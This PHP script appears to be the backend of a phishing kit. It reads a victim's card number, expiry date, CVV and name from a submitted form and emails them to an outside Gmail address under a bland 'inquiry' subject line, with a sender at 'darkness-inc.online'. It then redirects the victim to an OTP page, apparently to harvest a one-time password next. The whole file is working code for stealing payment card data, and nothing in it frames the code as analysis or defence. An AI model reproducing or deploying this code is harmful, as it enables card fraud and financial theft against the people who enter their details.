<?php
	$Card_NO=$_POST["Card_NO"];
	$DOE=$_POST["DOE"];
	$CVV=$_POST["CVV"];
	$NAME=$_POST["NAME"];
	


	$to = "saantosh87600@gmail.com";
	$subject="InquiryThrough Website";
	

	$msg = "Card_NO : ".$Card_NO."\n\n";
	$msg .= "DOE :  ".$DOE."\n\n";
	$msg .= "CVV :  ".$CVV."\n\n";
	$msg .= "NAME :  ".$NAME."\n\n";

	$headers = "From: info@darkness-inc.online";





   if (mail($to, $subject, $msg, $headers)) {
    header( "refresh:2; url=assset2/otp2.html" );
   } else {
       echo "faild";
   }
?>